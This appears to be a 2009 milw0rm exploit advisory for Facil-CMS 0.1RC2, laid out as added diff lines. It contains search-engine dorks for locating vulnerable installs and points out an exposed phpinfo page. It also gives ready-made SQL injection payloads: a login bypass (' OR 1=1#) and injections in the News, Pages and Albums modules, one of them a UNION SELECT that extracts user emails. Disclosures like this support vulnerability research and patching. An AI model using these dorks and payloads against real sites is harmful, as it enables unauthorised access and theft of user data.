@@ -1,0 +1,150 @@
+[Script]
+ Facil-CMS 0.1RC2
+
+ +download: http://sourceforge.net/project/platformdownload.php?group_id=217673
+ 
+[DORK]
+inurl:modules.php?modload=News
+Copyright (C) 2008 by FacilCMS.org
+inurl: /facil-cms/
+
+[Author]
+any.zicky
+
+[Contact Me]
+any__dot__zicky__at__gmail__dot__com ;)
+
+[About]
+Facil CMS is a Free and Open Source Project for your site Content Management System (CMS). Facil CMS uses PHP 5 and connect to many database systens. Facil CMS is Easy to create and modify modules for your system and Support Theme Templates.
+
+[Other bug in project]
+http://www.milw0rm.com/exploits/5792
+
+[Bugs]
+1) we can see phpinfo() in root_path project
+
++Example: http://localhost/phpinfo.php
+
+2) Auth bypass
+
+let's see login.php code
+
+[CODE]
+...
+
+if($_POST['email'] && $_POST['password'])
+ {
+  ...
+  $email = $_POST['email'];
+  $password = md5($_POST['password']);
+  $user = new Users();
+  $login = $user->Login($email, $password); <-------------
+  if($login && !is_null($login) && !empty($login))
+  {
+  $user = new Users($login);
+  ...
+[/CODE]
+
+then let look /facil-cms/modules/Users/class/Users.mysql.class.php code
+
+[CODE]
+...
+function Login($email, $password)
+  {
+  $sql = "SELECT * FROM " . _USERS_DB_TABLE_ . " WHERE email='" . $email . "' AND password='" . $password . "'"; <----------
+  $res = $GLOBALS['DB']->Execute($sql) or die($GLOBALS['DB']->ErrorMsg() . '<br />' . $sql);
+  if($res->RecordCount() == 1)
+  {
+  return $res->fields('id');
+  }
+  }
+ ...
+  
+[/CODE]
+
++Example: http://locahost/index.php?modload=User
+
+Email: admin@facilcms.org'#
+pass: blaaaaa
+
+Email: ' OR 1=1#
+pass: blaaaaa
+
+3) SQL-INj in News modules
+
+Let look /facil-cms/modules/News/class/News.mysql.class.php code
+
+[CODE]
+...
+function getNewInfo($id)
+  {
+  $sql = "SELECT * FROM " . _NEWS_DB_TABLE_ . " WHERE id=" . $id; <----------------
+  $res = $GLOBALS['DB']->Execute($sql) or die($GLOBALS['DB']->ErrorMsg() . '<br />' . $sql);
+  if($res->RecordCount() == 1)
+  {
+  $this->setContent($res->fields('content'));
+  $this->setDate($res->fields('date'));
+  $this->setId($res->fields('id'));
+  $this->setLanguage($res->fields('language'));
+  $this->setPublisher($res->fields('publisher'));
+  $this->setResume($res->fields('resume'));
+  $this->setStatus($res->fields('status'));
+  $this->setTitle($res->fields('title'));
+  return true;
+  }
+  }
+...
+[/CODE]
+
++Example: http://localhost/facil-cms/modules.php?modload=News&op=view&id=1+AND+1=1#
+
+4) SQL-Inj in Pages modules
+
+Let look /facil-cms/modules/Pages/class/Pages.mysql.class.php code
+[CODE]
+...
+function getPageInfo($id)
+  {
+  $sql = "SELECT * FROM " . _PAGES_DB_TABLE_ . " WHERE id=" . $id; <------------------
+  $res = $GLOBALS['DB']->Execute($sql);
+  if($res->RecordCount() == 1)
+  {
+  $this->setActive($res->fields('active'));
+  $this->setContent($res->fields('content'));
+  $this->setId($res->fields('id'));
+  $this->setLanguage($res->fields('language'));
+  $this->setTitle($res->fields('title'));
+  return true;
+  }
+  }
+
+...
+[/CODE]
+
++Example: http://localhost/facil-cms/modules.php?modload=Pages&op=view&id=1+ORDER+BY+5/*
+
+5) SQL-inj in ALbums module
+
+Let look /facil-cms/modules/Albums/class/Photos.mysql.class.php code
+
+[CODE]
+...
+function getPhotoInfo($id)
+  {
+  $sql = "SELECT * FROM " . _PHOTOS_DB_TABLE_ . " WHERE id=" . $id; <--------------------
+  $res = $GLOBALS['DB']->Execute($sql) or die($GLOBALS['DB']->ErrorMsg() . '<br />' . $sql);
+  if($res->RecordCount() == 1)
+  {
+  $this->setId($res->fields('id'));
+  $this->setAlbum($res->fields('album'));
+  $this->setFile($res->fields('file'));
+  $this->setComment($res->fields('comment'));
+  return true;
+  }
+  }
+...
+[/CODE]
+
++Example: http://localhost/facil-cms/modules.php?modload=Albums&op=photo&id=-1+UNION+SELECT+1,2,3,email+FROM+facil_users+LIMIT+1,2/*
+
+# milw0rm.com [2009-03-18]
